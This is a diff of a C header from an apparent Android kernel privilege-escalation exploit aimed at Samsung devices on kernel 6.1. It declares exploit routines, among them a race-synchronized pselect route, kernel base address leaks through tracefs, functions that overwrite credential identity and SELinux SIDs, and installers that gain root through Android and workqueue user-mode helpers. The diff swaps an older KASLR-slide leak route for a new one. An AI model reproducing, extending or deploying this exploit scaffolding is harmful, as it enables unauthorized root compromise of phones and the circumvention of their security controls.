@@ -41,7 +41,6 @@
 #include "kernelsnitch/utils.h"
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
 #define SKB_DATA_DELTA (-0xe80LL)
 
@@ -152,8 +151,6 @@
 #define PSELECT_TIMEOUT_SEC 0
 #endif
 #define PSELECT_TIMEOUT_USEC 200000
-#define SLIDE_PSELECT_TIMEOUT_SEC 1
-#define SLIDE_WAIT_SECONDS 2
 #define PSELECT_WRITE_SHAPE_DEFAULT 1
 #ifndef ROUTE_WAIT_SECONDS
 #define ROUTE_WAIT_SECONDS 1
@@ -170,7 +167,6 @@
 #define SLIDE_SYSCTL_BOOTID data_addr(SLIDE_SYSCTL_BOOTID_IMAGE)
 
 #define PAGE_PAYLOAD_FOPS 0
-#define PAGE_PAYLOAD_SLIDE 1
 
 struct kernelsnitch_shared_state;
 
@@ -371,7 +367,6 @@ int run_exploit(int argc, char **argv);
 int should_stop_cred_write(void);
 void read_first_line(const char *path, char *buf, size_t len);
 void log_startup_context(void);
-void log_slide_child_context(void);
 void disable_rseq_for_thread(void);
 void init_p0_profile(void);
 extern uint64_t p0_kernel_phys_load;
@@ -412,6 +407,7 @@ int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
 void setup_kernelsnitch(void);
+void setup_kernelsnitch_sized(size_t mm_struct_size);
 int kernelsnitch_collision_count(void);
 int kernelsnitch_collisions_ready(void);
 void run_kernelsnitch_bruteforce(void);
@@ -435,25 +431,14 @@ void do_pselect_fake_lock_route(void);
 void reset_main_route_state(void);
 int run_main_route_threads(void);
 
-int slide_pselect_words_per_set(void);
-int slide_pselect_global_word(int waiter_word);
-int slide_pselect_put_global_word(
-    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
-    int global_word, uint64_t value);
-uint64_t slide_pselect_get_global_word(
-    const fd_set *in, const fd_set *out, const fd_set *ex,
-    int words_per_set, int global_word);
-void slide_pselect_put_waiter_word(
-    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
-    int waiter_word, uint64_t value, const char *name);
-void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
-void open_slide_selected_fds(
-    fd_set *in, fd_set *out, fd_set *ex, int read_fd);
-void slide_pselect_stack_copy(void);
-int hex_value(char c);
-uint64_t slide_read_stext(void);
-uint64_t slide_child_leak_stext(void);
-int slide_leak_kernel_base(void);
+/* EDEADLK-synchronized route for Samsung 6.1. */
+uint64_t mono_ns(void);
+extern atomic_int gk_pselect_entered, gk_route_done, gk_window_hit;
+extern atomic_int gk_fire_success;
+extern _Atomic uint64_t gk_enter_ts;
+int run_sync_route(void);
+void sync_pselect_phase(void);
+int tracefs_leak_kernel_base(uint64_t *out);
 
 ssize_t configfs_write_once(
     int fd, uintptr_t target, const void *data, size_t len);
@@ -514,6 +499,11 @@ int patch_cred_identity(int fd, uintptr_t cred);
 int patch_cred_sid(int fd, uintptr_t cred);
 int patch_cred_object(int fd, uintptr_t cred);
 int install_android_root(int fd);
+int install_workqueue_umh_root(int fd, const char *helper_path,
+                               const char *helper_arg);
+const char *ghostlock_root_script_path(void);
+int ghostlock_umh_entry(int argc, char **argv);
+int ghostlock_late_load_client(void);
 
 #include "runtime_struct_offsets.h"
 
